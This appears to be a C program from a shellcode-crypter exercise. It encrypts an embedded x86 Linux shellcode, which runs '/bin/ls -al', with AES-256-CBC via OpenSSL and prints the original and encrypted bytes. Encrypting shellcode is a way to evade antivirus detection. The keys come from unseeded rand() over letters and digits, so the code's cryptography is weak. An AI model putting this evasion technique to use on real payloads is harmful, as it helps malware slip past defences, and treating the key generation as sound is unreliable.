#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void print_shellcode(unsigned char *shellcode)
{
  int i, len;

  len = strlen(shellcode);

  for (i = 0; i < len; i++)
  {
    printf("\\x%02x", shellcode[i]);
  }
    printf("\n");
}

//modified http://codereview.stackexchange.com/questions/29198/random-string-generator-in-c
static char *random_string(char *str, size_t size)
{
  const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  int i, n;
  n = 0;

  for (i = 0; n < size; n++)
  {
    int key = rand() % (int) (sizeof charset - 1);
    str[n] = charset[key];
  }
  str[size] = '\0';
  return str;
}

int main (void)
{
  unsigned char key[32]; 
  unsigned char iv[16]; 

  int key_len, iv_len;
  key_len = 32;
  iv_len = 16;

  random_string(key, key_len); // random AES 256 bit key
  random_string(iv, iv_len); // random AES 128 bit initialization vector

  printf("[+] AES 128 bit IV: %s\n", (iv));
  printf("[+] AES 256 bit Key: %s\n", (key));

  //shellcode
  unsigned char shellcode[] = "\x6a\x0b\x58\x31\xd2\x52\x68\x2d\x61\x6c\x68\x89\xe1\x52\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

  unsigned char encrypted[128]; //buffer for encrypted shellcode
  int shellcode_len, encrypted_len; 

  shellcode_len = strlen(shellcode);
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  encrypted_len = encrypt(shellcode, shellcode_len, key, iv, encrypted);

  shellcode[shellcode_len] = '\0';
  encrypted[encrypted_len] = '\0';

  printf("[+] Original Shellcode (%d bytes):\n", (shellcode_len));
  print_shellcode(shellcode);

  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
  print_shellcode(encrypted);

  EVP_cleanup();
  ERR_free_strings();

  return 0;
}
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

int encrypt(unsigned char *shellcode, int shellcode_len, unsigned char *key, unsigned char *iv, unsigned char *encrypted)
{
  EVP_CIPHER_CTX *ciphertext; //openssl EVP ciphertext structure

  int len, encrypted_len;

  if(!(ciphertext = EVP_CIPHER_CTX_new()))
    handleErrors(); //error handler

  EVP_EncryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);
  EVP_EncryptUpdate(ciphertext, encrypted, &len, shellcode, shellcode_len); 
  encrypted_len = len; 
  EVP_EncryptFinal_ex(ciphertext, encrypted + len, &len); 
  encrypted_len += len; 
  EVP_CIPHER_CTX_free(ciphertext); 

  return encrypted_len;
}
